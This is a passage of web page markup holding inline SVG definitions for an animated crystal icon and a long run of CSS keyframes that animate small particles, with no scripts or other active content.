                        <lineargradient id="mastericon-crystal_input-s-path22-fill" x1="11" x2="7.281" y1="34" y2="19.708" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path22-fill-0" offset="0%" stop-color="var(--mines-star-linear-02)"></stop>
                          <stop id="mastericon-crystal_input-s-path22-fill-1" offset="100%" stop-color="var(--mines-star-linear-01)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path23-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path23-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path23-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path24-fill" x1="5" x2="7.951" y1="11.5" y2="24.243" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path24-fill-0" offset="0%" stop-color="var(--mines-star-linear-01)"></stop>
                          <stop id="mastericon-crystal_input-s-path24-fill-1" offset="100%" stop-color="var(--mines-star-linear-02)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path25-stroke" x1="9.636" x2="22.973" y1="5.783" y2="25.591" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path25-stroke-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-path25-stroke-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path26-fill" x1="13.058" x2="16.899" y1="5.671" y2="14.268" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path26-fill-0" offset="0%" stop-color="#c2f952"></stop>
                          <stop id="mastericon-crystal_input-s-path26-fill-1" offset="100%" stop-color="#7da929"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path27-fill" x1="6.655" x2="10.863" y1="11.159" y2="19.939" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path27-fill-0" offset="0%" stop-color="#b9eb5e"></stop>
                          <stop id="mastericon-crystal_input-s-path27-fill-1" offset="100%" stop-color="#4d6a11"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path28-fill" x1="22.204" x2="26.229" y1="11.342" y2="20.854" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path28-fill-0" offset="0%" stop-color="#82ad2e"></stop>
                          <stop id="mastericon-crystal_input-s-path28-fill-1" offset="100%" stop-color="#4d6a11"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path29-fill" x1="22.022" x2="9.034" y1="30.732" y2="21.403" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path29-fill-0" offset="0%" stop-color="#52700e"></stop>
                          <stop id="mastericon-crystal_input-s-path29-fill-1" offset="100%" stop-color="#9dd61b"></stop>
                        </lineargradient>
                        <lineargradient id="mastericon-crystal_input-s-path30-fill" x1="16.168" x2="10.497" y1="29.269" y2="18.476" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-path30-fill-0" offset="0%" stop-color="#506f0c"></stop>
                          <stop id="mastericon-crystal_input-s-path30-fill-1" offset="100%" stop-color="#96c81d"></stop>
                        </lineargradient>
                        <radialgradient id="mastericon-crystal_input-s-circle1-fill" cx="0" cy="0" r="1" gradientTransform="rotate(90) scale(19.9393)" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-circle1-fill-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-circle1-fill-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </radialgradient>
                        <radialgradient id="mastericon-crystal_input-s-circle2-fill" cx="0" cy="0" r="1" gradientTransform="rotate(90) scale(19.9393)" gradientUnits="userSpaceOnUse" spreadMethod="pad">
                          <stop id="mastericon-crystal_input-s-circle2-fill-0" offset="0%" stop-color="#fff"></stop>
                          <stop id="mastericon-crystal_input-s-circle2-fill-1" offset="100%" stop-color="rgba(255,255,255,0)"></stop>
                        </radialgradient>
                      </defs>
                      <g id="mastericon-crystal_input-u-copy-of-group_ts" transform="matrix(.85 0 0 .85 15.985 17.378)">
                        <g id="mastericon-crystal_input-u-copy-of-group" clip-path="url(#mastericon-crystal_input-u-clip0_3979_18950)" opacity="0" transform="translate(-15.985 -17.378)">
                          <g id="mastericon-crystal_input-s-g1">
                            <path id="mastericon-crystal_input-s-path1" fill="url(#mastericon-crystal_input-s-path1-fill)" d="M22.636 8.084 18.22 2.866a2.927 2.927 0 0 0-4.469 0L9.336 8.084l6.65 8.787 6.65-8.787Z"></path>
                            <path id="mastericon-crystal_input-s-path2" fill="none" stroke="url(#mastericon-crystal_input-s-path2-stroke)" stroke-opacity=".3" stroke-width=".366" d="m18.08 2.984 4.321 5.107-6.415 8.477L9.57 8.09l4.32-5.107a2.744 2.744 0 0 1 4.19 0Z"></path>
                            <path id="mastericon-crystal_input-s-path3" fill="url(#mastericon-crystal_input-s-path3-fill)" d="M30.344 14.92a2.927 2.927 0 0 0-1.381-4.25l-6.328-2.586-6.65 8.787 10.76 3.862 3.599-5.812Z"></path>
                            <path id="mastericon-crystal_input-s-path4" fill="none" stroke="url(#mastericon-crystal_input-s-path4-stroke)" stroke-opacity=".3" stroke-width=".366" d="M28.894 10.84a2.744 2.744 0 0 1 1.294 3.984l-3.52 5.686-10.387-3.727 6.415-8.476 6.198 2.533Z"></path>
                            <path id="mastericon-crystal_input-s-path5" fill="url(#mastericon-crystal_input-s-path5-fill)" d="M22.625 30.177a2.927 2.927 0 0 0 3.615-2.627l.505-6.817-10.76-3.862v11.68l6.64 1.626Z"></path>
                            <path id="mastericon-crystal_input-s-path6" fill="none" stroke="url(#mastericon-crystal_input-s-path6-stroke)" stroke-opacity=".3" stroke-width=".366" d="M26.058 27.537a2.744 2.744 0 0 1-3.39 2.462l-6.5-1.592V17.13l10.384 3.727-.494 6.679Z"></path>
                            <path id="mastericon-crystal_input-s-path7" fill="url(#mastericon-crystal_input-s-path7-fill)" d="M5.73 27.55a2.927 2.927 0 0 0 3.616 2.627l6.64-1.627V16.871l-10.76 3.862.505 6.817Z"></path>
                            <path id="mastericon-crystal_input-s-path8" fill="none" stroke="url(#mastericon-crystal_input-s-path8-stroke)" stroke-opacity=".3" stroke-width=".366" d="M9.303 30a2.744 2.744 0 0 1-3.39-2.463l-.494-6.679 10.384-3.727v11.276l-6.5 1.592Z"></path>
                            <path id="mastericon-crystal_input-s-path9" fill="url(#mastericon-crystal_input-s-path9-fill)" d="M3.008 10.67a2.927 2.927 0 0 0-1.381 4.25l3.599 5.813 10.76-3.862-6.65-8.787-6.328 2.587Z"></path>
                            <path id="mastericon-crystal_input-s-path10" fill="none" stroke="url(#mastericon-crystal_input-s-path10-stroke)" stroke-opacity=".3" stroke-width=".366" d="M1.782 14.824a2.744 2.744 0 0 1 1.295-3.984l6.198-2.533 6.414 8.476L5.303 20.51l-3.52-5.686Z"></path>
                            <g id="mastericon-crystal_input-s-g2" mask="url(#mastericon-crystal_input-u-mask0_3979_18950)">
                              <g id="mastericon-crystal_input-s-g3">
                                <circle id="mastericon-crystal_input-s-circle1" r="19.939" fill="url(#mastericon-crystal_input-s-circle1-fill)" fill-opacity=".5" transform="translate(15.985 17.378)"></circle>
                              </g>
                              <mask id="mastericon-crystal_input-u-mask0_3979_18950" width="400%" height="400%" x="-150%" y="-150%" maskType="alpha">
                                <path id="mastericon-crystal_input-s-path11" fill="url(#mastericon-crystal_input-s-path11-fill)" d="M22.635 7.86 18.22 2.64a2.927 2.927 0 0 0-4.469 0L9.336 7.86l6.65 8.787 6.65-8.787Z"></path>
                                <path id="mastericon-crystal_input-s-path12" fill="url(#mastericon-crystal_input-s-path12-fill)" d="M3.008 10.446a2.927 2.927 0 0 0-1.381 4.25l3.599 5.812 10.76-3.861-6.65-8.787-6.328 2.586Z"></path>
                                <path id="mastericon-crystal_input-s-path13" fill="url(#mastericon-crystal_input-s-path13-fill)" d="M30.344 14.697a2.927 2.927 0 0 0-1.381-4.25L22.635 7.86l-6.65 8.787 10.76 3.861 3.599-5.811Z"></path>
                                <path id="mastericon-crystal_input-s-path14" fill="url(#mastericon-crystal_input-s-path14-fill)" d="M22.625 29.953a2.927 2.927 0 0 0 3.615-2.627l.505-6.818-10.76-3.861v11.679l6.64 1.627Z"></path>
                                <path id="mastericon-crystal_input-s-path15" fill="url(#mastericon-crystal_input-s-path15-fill)" d="M5.73 27.326a2.927 2.927 0 0 0 3.616 2.627l6.64-1.627v-11.68l-10.76 3.862.504 6.818Z"></path>
                              </mask>
                            </g>
                          </g>
                          <clippath id="mastericon-crystal_input-u-clip0_3979_18950">
                            <rect id="mastericon-crystal_input-s-rect1" width="32" height="32" fill="#fff" rx="0" ry="0"></rect>
                          </clippath>
                        </g>
                      </g>
                      <g id="mastericon-crystal_input-u-mask-group" mask="url(#mastericon-crystal_input-u-masks)">
                        <g id="mastericon-crystal_input-u-copy-of-rectangle_to" transform="translate(31.993 4.938)">
                          <rect id="mastericon-crystal_input-u-copy-of-rectangle" width="5.676" height="32" fill="url(#mastericon-crystal_input-u-copy-of-rectangle-fill)" stroke-width="0" opacity=".7" rx="0" ry="0" transform="matrix(1.52465 -1.06902 .5741 .81879 -13.512 -10.067)"></rect>
                        </g>
                        <mask id="mastericon-crystal_input-u-masks" width="400%" height="400%" x="-150%" y="-150%" maskType="luminance">
                          <g id="mastericon-crystal_input-u-copy-of-group-2_ts" transform="matrix(.85 0 0 .85 15.985 17.378)">
                            <g id="mastericon-crystal_input-u-copy-of-group-2" clip-path="url(#mastericon-crystal_input-u-clip0_3979_189502)" opacity="0" transform="translate(-15.985 -17.378)">
                              <g id="mastericon-crystal_input-s-g4">
                                <path id="mastericon-crystal_input-s-path16" fill="url(#mastericon-crystal_input-s-path16-fill)" d="M22.636 8.084 18.22 2.866a2.927 2.927 0 0 0-4.469 0L9.336 8.084l6.65 8.787 6.65-8.787Z"></path>
                                <path id="mastericon-crystal_input-s-path17" fill="none" stroke="url(#mastericon-crystal_input-s-path17-stroke)" stroke-opacity=".3" stroke-width=".366" d="m18.08 2.984 4.321 5.107-6.415 8.477L9.57 8.09l4.32-5.107a2.744 2.744 0 0 1 4.19 0Z"></path>
                                <path id="mastericon-crystal_input-s-path18" fill="url(#mastericon-crystal_input-s-path18-fill)" d="M30.344 14.92a2.927 2.927 0 0 0-1.381-4.25l-6.328-2.586-6.65 8.787 10.76 3.862 3.599-5.812Z"></path>
                                <path id="mastericon-crystal_input-s-path19" fill="none" stroke="url(#mastericon-crystal_input-s-path19-stroke)" stroke-opacity=".3" stroke-width=".366" d="M28.894 10.84a2.744 2.744 0 0 1 1.294 3.984l-3.52 5.686-10.387-3.727 6.415-8.476 6.198 2.533Z"></path>
                                <path id="mastericon-crystal_input-s-path20" fill="url(#mastericon-crystal_input-s-path20-fill)" d="M22.625 30.177a2.927 2.927 0 0 0 3.615-2.627l.505-6.817-10.76-3.862v11.68l6.64 1.626Z"></path>
                                <path id="mastericon-crystal_input-s-path21" fill="none" stroke="url(#mastericon-crystal_input-s-path21-stroke)" stroke-opacity=".3" stroke-width=".366" d="M26.058 27.537a2.744 2.744 0 0 1-3.39 2.462l-6.5-1.592V17.13l10.384 3.727-.494 6.679Z"></path>
                                <path id="mastericon-crystal_input-s-path22" fill="url(#mastericon-crystal_input-s-path22-fill)" d="M5.73 27.55a2.927 2.927 0 0 0 3.616 2.627l6.64-1.627V16.871l-10.76 3.862.505 6.817Z"></path>
                                <path id="mastericon-crystal_input-s-path23" fill="none" stroke="url(#mastericon-crystal_input-s-path23-stroke)" stroke-opacity=".3" stroke-width=".366" d="M9.303 30a2.744 2.744 0 0 1-3.39-2.463l-.494-6.679 10.384-3.727v11.276l-6.5 1.592Z"></path>
                                <path id="mastericon-crystal_input-s-path24" fill="url(#mastericon-crystal_input-s-path24-fill)" d="M3.008 10.67a2.927 2.927 0 0 0-1.381 4.25l3.599 5.813 10.76-3.862-6.65-8.787-6.328 2.587Z"></path>
                                <path id="mastericon-crystal_input-s-path25" fill="none" stroke="url(#mastericon-crystal_input-s-path25-stroke)" stroke-opacity=".3" stroke-width=".366" d="M1.782 14.824a2.744 2.744 0 0 1 1.295-3.984l6.198-2.533 6.414 8.476L5.303 20.51l-3.52-5.686Z"></path>
                                <g id="mastericon-crystal_input-s-g5" mask="url(#mastericon-crystal_input-u-mask0_3979_189502)">
                                  <g id="mastericon-crystal_input-s-g6">
                                    <circle id="mastericon-crystal_input-s-circle2" r="19.939" fill="url(#mastericon-crystal_input-s-circle2-fill)" fill-opacity=".5" transform="translate(15.985 17.378)"></circle>
                                  </g>
                                  <mask id="mastericon-crystal_input-u-mask0_3979_189502" width="400%" height="400%" x="-150%" y="-150%" maskType="alpha">
                                    <path id="mastericon-crystal_input-s-path26" fill="url(#mastericon-crystal_input-s-path26-fill)" d="M22.635 7.86 18.22 2.64a2.927 2.927 0 0 0-4.469 0L9.336 7.86l6.65 8.787 6.65-8.787Z"></path>
                                    <path id="mastericon-crystal_input-s-path27" fill="url(#mastericon-crystal_input-s-path27-fill)" d="M3.008 10.446a2.927 2.927 0 0 0-1.381 4.25l3.599 5.812 10.76-3.861-6.65-8.787-6.328 2.586Z"></path>
                                    <path id="mastericon-crystal_input-s-path28" fill="url(#mastericon-crystal_input-s-path28-fill)" d="M30.344 14.697a2.927 2.927 0 0 0-1.381-4.25L22.635 7.86l-6.65 8.787 10.76 3.861 3.599-5.811Z"></path>
                                    <path id="mastericon-crystal_input-s-path29" fill="url(#mastericon-crystal_input-s-path29-fill)" d="M22.625 29.953a2.927 2.927 0 0 0 3.615-2.627l.505-6.818-10.76-3.861v11.679l6.64 1.627Z"></path>
                                    <path id="mastericon-crystal_input-s-path30" fill="url(#mastericon-crystal_input-s-path30-fill)" d="M5.73 27.326a2.927 2.927 0 0 0 3.616 2.627l6.64-1.627v-11.68l-10.76 3.862.504 6.818Z"></path>
                                  </mask>
                                </g>
                              </g>
                              <clippath id="mastericon-crystal_input-u-clip0_3979_189502">
                                <rect id="mastericon-crystal_input-s-rect2" width="32" height="32" fill="#fff" rx="0" ry="0"></rect>
                              </clippath>
                            </g>
                          </g>
                        </mask>
                      </g>
                    </svg>
                    <div class="particles-fXQxs8DOFn">
                      <svg id="particles" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" viewBox="-12 -10 56 56">
                        <style>
                          @keyframes particles-u-6_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            38.732394%,
                            to {
                              transform: translate(33.512053px, 25.957982px)
                            }
                          }
                          
                          @keyframes particles-u-6_c_o {
                            0% {
                              opacity: 1
                            }
                            38.732394%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-5_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            70.422535%,
                            to {
                              transform: translate(25.435974px, 35.350813px)
                            }
                          }
                          
                          @keyframes particles-u-5_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-4_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            91.549296%,
                            to {
                              transform: translate(-1.425767px, 23.851179px)
                            }
                          }
                          
                          @keyframes particles-u-4_c_o {
                            0%,
                            63.380282% {
                              opacity: 1
                            }
                            91.549296%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-3_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            70.422535%,
                            to {
                              transform: translate(-3.26922px, 12.000411px)
                            }
                          }
                          
                          @keyframes particles-u-3_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-2_to__to {
                            0% {
                              transform: translate(14.952035px, 16.47642px)
                            }
                            98.591549%,
                            to {
                              transform: translate(-2.487965px, .81642px)
                            }
                          }
                          
                          @keyframes particles-u-2_c_o {
                            0%,
                            70.422535% {
                              opacity: 1
                            }
                            98.591549%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-32_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            56.338028%,
                            to {
                              transform: translate(14.491577px, 35.740187px)
                            }
                          }
                          
                          @keyframes particles-u-32_c_o {
                            0%,
                            28.169014% {
                              opacity: 1
                            }
                            56.338028%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-33_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            42.253521%,
                            to {
                              transform: translate(8.434518px, -1.918921px)
                            }
                          }
                          
                          @keyframes particles-u-33_c_o {
                            0%,
                            14.084507% {
                              opacity: 1
                            }
                            42.253521%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-22_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            35.211268%,
                            to {
                              transform: translate(33.101672px, 18.35906px)
                            }
                          }
                          
                          @keyframes particles-u-22_c_o {
                            0%,
                            7.042254% {
                              opacity: 1
                            }
                            35.211268%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-34_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            63.380282%,
                            to {
                              transform: translate(23.997808px, .173398px)
                            }
                          }
                          
                          @keyframes particles-u-34_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-23_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            70.422535%,
                            to {
                              transform: translate(15.395029px, -1.845621px)
                            }
                          }
                          
                          @keyframes particles-u-23_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-24_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            77.464789%,
                            to {
                              transform: translate(37.253113px, 10.356281px)
                            }
                          }
                          
                          @keyframes particles-u-24_c_o {
                            0%,
                            49.295775% {
                              opacity: 1
                            }
                            77.464789%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-1_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            63.380282%,
                            to {
                              transform: translate(33.917341px, 32.916632px)
                            }
                          }
                          
                          @keyframes particles-u-1_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-12_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            63.380282%,
                            to {
                              transform: translate(3.528999px, 32.792242px)
                            }
                          }
                          
                          @keyframes particles-u-12_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-0_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            35.211268%,
                            to {
                              transform: translate(29.688473px, 4.525965px)
                            }
                          }
                          
                          @keyframes particles-u-0_c_o {
                            0%,
                            7.042254% {
                              opacity: 1
                            }
                            35.211268%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-13_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            56.338028%,
                            to {
                              transform: translate(1.597764px, -3.46233px)
                            }
                          }
                          
                          @keyframes particles-u-13_c_o {
                            0%,
                            28.169014% {
                              opacity: 1
                            }
                            56.338028%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-s-ellipse1_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            35.211268%,
                            to {
                              transform: translate(29.688473px, 4.525965px)
                            }
                          }
                          
                          @keyframes particles-s-ellipse1_c_o {
                            0%,
                            7.042254% {
                              opacity: 1
                            }
                            35.211268%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            56.338028%,
                            to {
                              transform: translate(1.597764px, -3.46233px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse_c_o {
                            0%,
                            28.169014% {
                              opacity: 1
                            }
                            56.338028%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse2_to__to {
                            0% {
                              transform: translate(15.379768px, 17.956835px)
                            }
                            63.380282%,
                            to {
                              transform: translate(3.528999px, 32.792242px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse2_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse3_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            63.380282%,
                            to {
                              transform: translate(33.917341px, 32.916632px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse3_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-2_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            77.464789%,
                            to {
                              transform: translate(37.253113px, 10.356281px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-2_c_o {
                            0%,
                            49.295775% {
                              opacity: 1
                            }
                            77.464789%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-22_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            70.422535%,
                            to {
                              transform: translate(15.395029px, -1.845621px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-22_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-3_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            63.380282%,
                            to {
                              transform: translate(23.997808px, .173398px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-3_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-23_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            35.211268%,
                            to {
                              transform: translate(33.101672px, 18.35906px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-23_c_o {
                            0%,
                            7.042254% {
                              opacity: 1
                            }
                            35.211268%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-32_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            42.253521%,
                            to {
                              transform: translate(8.434518px, -1.918921px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-32_c_o {
                            0%,
                            14.084507% {
                              opacity: 1
                            }
                            42.253521%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-33_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            56.338028%,
                            to {
                              transform: translate(14.491577px, 35.740187px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-33_c_o {
                            0%,
                            28.169014% {
                              opacity: 1
                            }
                            56.338028%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-24_to__to {
                            0% {
                              transform: translate(14.952035px, 16.47642px)
                            }
                            98.591549%,
                            to {
                              transform: translate(-2.487965px, .81642px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-24_c_o {
                            0%,
                            70.422535% {
                              opacity: 1
                            }
                            98.591549%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-34_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            70.422535%,
                            to {
                              transform: translate(-3.26922px, 12.000411px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-34_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-4_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            91.549296%,
                            to {
                              transform: translate(-1.425767px, 23.851179px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-4_c_o {
                            0%,
                            63.380282% {
                              opacity: 1
                            }
                            91.549296%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-5_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            70.422535%,
                            to {
                              transform: translate(25.435974px, 35.350813px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-5_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-6_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            38.732394%,
                            to {
                              transform: translate(33.512053px, 25.957982px)
                            }
                          }
                          
                          @keyframes particles-u-copy-of-ellipse-6_c_o {
                            0% {
                              opacity: 1
                            }
                            38.732394%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-62_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            38.732394%,
                            to {
                              transform: translate(33.512053px, 25.957982px)
                            }
                          }
                          
                          @keyframes particles-u-62_c_o {
                            0% {
                              opacity: 1
                            }
                            38.732394%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-52_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            70.422535%,
                            to {
                              transform: translate(25.435974px, 35.350813px)
                            }
                          }
                          
                          @keyframes particles-u-52_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-42_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            91.549296%,
                            to {
                              transform: translate(-1.425767px, 23.851179px)
                            }
                          }
                          
                          @keyframes particles-u-42_c_o {
                            0%,
                            63.380282% {
                              opacity: 1
                            }
                            91.549296%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-35_to__to {
                            0% {
                              transform: translate(13.760773px, 18.847521px)
                            }
                            70.422535%,
                            to {
                              transform: translate(-3.26922px, 12.000411px)
                            }
                          }
                          
                          @keyframes particles-u-35_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-25_to__to {
                            0% {
                              transform: translate(14.952035px, 16.47642px)
                            }
                            98.591549%,
                            to {
                              transform: translate(-2.487965px, .81642px)
                            }
                          }
                          
                          @keyframes particles-u-25_c_o {
                            0%,
                            70.422535% {
                              opacity: 1
                            }
                            98.591549%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-36_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            56.338028%,
                            to {
                              transform: translate(14.491577px, 35.740187px)
                            }
                          }
                          
                          @keyframes particles-u-36_c_o {
                            0%,
                            28.169014% {
                              opacity: 1
                            }
                            56.338028%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-37_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            42.253521%,
                            to {
                              transform: translate(8.434518px, -1.918921px)
                            }
                          }
                          
                          @keyframes particles-u-37_c_o {
                            0%,
                            14.084507% {
                              opacity: 1
                            }
                            42.253521%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-26_to__to {
                            0% {
                              transform: translate(17.037297px, 17.305659px)
                            }
                            35.211268%,
                            to {
                              transform: translate(33.101672px, 18.35906px)
                            }
                          }
                          
                          @keyframes particles-u-26_c_o {
                            0%,
                            7.042254% {
                              opacity: 1
                            }
                            35.211268%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-38_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            63.380282%,
                            to {
                              transform: translate(23.997808px, .173398px)
                            }
                          }
                          
                          @keyframes particles-u-38_c_o {
                            0%,
                            35.211268% {
                              opacity: 1
                            }
                            63.380282%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-27_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            70.422535%,
                            to {
                              transform: translate(15.395029px, -1.845621px)
                            }
                          }
                          
                          @keyframes particles-u-27_c_o {
                            0%,
                            42.253521% {
                              opacity: 1
                            }
                            70.422535%,
                            to {
                              opacity: 0
                            }
                          }
                          
                          @keyframes particles-u-28_to__to {
                            0% {
                              transform: translate(16.097297px, 17.905659px)
                            }
                            77.464789%,
                            to {
                              transform: translate(37.253113px, 10.356281px)
                            }
                          }
                          
                          @keyframes particles-u-28_c_o {
                            0%,
                            49.295775% {
